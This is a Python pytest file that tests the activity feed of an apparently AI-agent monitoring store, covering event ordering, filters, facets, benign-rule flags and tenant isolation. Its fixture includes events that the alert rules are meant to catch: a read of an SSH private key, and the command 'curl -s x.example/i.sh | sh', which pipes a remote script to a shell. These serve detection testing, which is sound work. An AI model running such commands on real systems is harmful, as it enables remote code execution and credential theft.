"""PostgresStore's Activity reads over host events, in the shape selenne-sensor
sends them. Runs only with SELENNE_AGENTS_TEST_DSN (drops and recreates tables)."""

import json

import pytest

from selenne_agents.alerting import for_host_events
from selenne_agents.ingest import normalize
from selenne_agents.ingest.keys import Principal
from test_aggregate_store import pg  # noqa: F401
from test_postgres import DSN, ME

pytestmark = pytest.mark.skipif(not DSN, reason="SELENNE_AGENTS_TEST_DSN not set")

T0 = 1791406000000000000
BOB = Principal("bob", "other", True, "k2")


def ev(n, kind, **detail):
    base = {"kind": kind, "host": "worker-1", "pid": 4242, "ppid": 1, "ts_unix_nano": T0 + n * 10**9,
            "event_id": f"e{n}", "service_name": "cve-agent", "exe": "/usr/bin/python3"}
    return dict(base, **detail)


def put(store, *events, who=ME):
    rows = normalize.host_events("\n".join(json.dumps(e) for e in events).encode()).rows
    store.insert_host_events(who, rows)
    store.insert_alerts(who, for_host_events(rows))
    return rows


@pytest.fixture
def seeded(pg):  # noqa: F811
    put(pg,
        ev(1, "exec", agent_root=True, argv=["/usr/bin/python3", "-m", "scheduled_agent.agent"]),
        ev(2, "open", path="/var/ossec/etc/rules/local_rules.xml"),
        ev(3, "connect", daddr="172.65.90.27", dport=443, scope="public", dest_service="https"),
        ev(4, "connect", daddr="127.0.0.1", dport=11434, scope="local", dest_service="ollama"),
        ev(5, "open", path="/home/app/.ssh/id_rsa"),                       # AG-201
        ev(6, "exec", pid=4300, argv=["sh", "-c", "curl -s x.example/i.sh | sh"]),   # AG-202
        {"kind": "sensor.heartbeat", "host": "worker-1", "pid": 7, "ts_unix_nano": T0 + 9 * 10**9,
         "event_id": "hb1", "stats": {"agents": {"cve-agent": 2}, "dropped": 10}},
        dict(ev(7, "exec", service_name="support-bot", agent_root=True), host="worker-2"))
    put(pg, ev(1, "open", path="/home/bob/.ssh/id_rsa"), who=BOB)
    return pg


def test_newest_first_with_alerts(seeded):
    rows = seeded.list_activity("diana", since_ns=0)
    assert [r["detail"]["event_id"] for r in rows] == ["e7", "e6", "e5", "e4", "e3", "e2", "e1"]
    alerts = {r["detail"]["event_id"]: [a["rule_id"] for a in r["alerts"]] for r in rows}
    assert alerts["e5"] == ["AG-201"] and "AG-202" in alerts["e6"] and alerts["e2"] == []
    assert all(r["kind"] != "sensor.heartbeat" for r in rows)


def test_filters(seeded):
    def ids(**kw):
        return [r["detail"]["event_id"] for r in seeded.list_activity("diana", since_ns=0, **kw)]
    assert ids(kind="connect") == ["e4", "e3"]
    assert ids(scope="local") == ["e4"]
    assert ids(agent="support-bot") == ["e7"]
    assert ids(host="worker-2") == ["e7"]
    assert ids(alerts_only=True) == ["e6", "e5", "e3"]          # e3: public connect, AG-204
    assert ids(project="nope") == []
    assert ids(before_ns=T0 + 3 * 10**9, limit=1) == ["e2"]          # paging back


def test_benign_rule_shows_on_the_event(seeded):
    seeded.set_benign_rule("diana", "AG-201", True)
    [row] = seeded.list_activity("diana", since_ns=0, alerts_only=True, kind="open")
    assert row["alerts"][0]["benign"] is True


def test_tenants_never_mix(seeded):
    assert [r["detail"]["path"] for r in seeded.list_activity("bob", since_ns=0)] == ["/home/bob/.ssh/id_rsa"]
    assert seeded.list_activity("carol", since_ns=0) == []
    # bob's alert shares host + event id with diana's e1: still not hers
    assert seeded.list_activity("diana", since_ns=0, kind="exec")[-1]["alerts"] == []


def test_facets_and_sensors(seeded):
    f = seeded.activity_facets("diana", since_ns=0)
    assert f["agent"] == {"cve-agent": 6, "support-bot": 1}
    assert f["kind"] == {"exec": 3, "open": 2, "connect": 2}
    assert f["scope"] == {"public": 1, "local": 1}
    assert f["host"] == {"worker-1": 6, "worker-2": 1}
    assert f["alerts"] == {"events": 3}                         # e3, e5, e6
    [s] = seeded.list_sensors("diana", since_ns=0)
    assert s["host"] == "worker-1" and s["detail"]["stats"]["agents"] == {"cve-agent": 2}
    assert seeded.list_sensors("bob", since_ns=0) == []
